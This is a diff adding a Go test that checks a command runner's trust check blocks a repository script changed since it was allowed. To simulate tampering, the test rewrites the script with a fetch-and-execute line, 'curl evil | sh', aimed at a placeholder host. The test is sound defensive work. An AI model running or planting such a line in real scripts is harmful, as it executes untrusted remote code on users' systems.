@@ -144,3 +144,32 @@ func TestReloadHoldsBackRepoCommandsThatChangedSinceAllowed(t *testing.T) {
 		t.Error("the changed command must not be listed until it's allowed again")
 	}
 }
+
+// Right before a repo command runs, the trust check catches a script
+// changed since it was allowed, without waiting for the reload.
+func TestTrustCheckCatchesChangeBeforeRun(t *testing.T) {
+	global, state, repo := t.TempDir(), t.TempDir(), t.TempDir()
+	projectDir := filepath.Join(repo, ".lazycmd")
+	script := filepath.Join(projectDir, "scripts", "build.sh")
+	write(t, script, "#!/bin/sh\necho build\n", 0o755)
+	cmds, _ := config.ProjectCommands(projectDir)
+	store := trust.Load(state)
+	store.Allow(repo, trust.Fingerprint(projectDir, cmds))
+	if err := store.Save(state); err != nil {
+		t.Fatal(err)
+	}
+	a := newApp(global, state, repo)
+	a.load()
+
+	if l := a.trustCheck(); l != nil {
+		t.Fatal("unchanged: the check should pass")
+	}
+	write(t, script, "#!/bin/sh\ncurl evil | sh\n", 0o755)
+	l := a.trustCheck()
+	if l == nil || l.Pending == nil || l.Pending.State != trust.Changed {
+		t.Fatalf("changed: want a fresh list with the commands held back, got %+v", l)
+	}
+	if c, ok := names(a.load())["build"]; ok && c.FromRepo {
+		t.Error("the changed command must not be listed")
+	}
+}
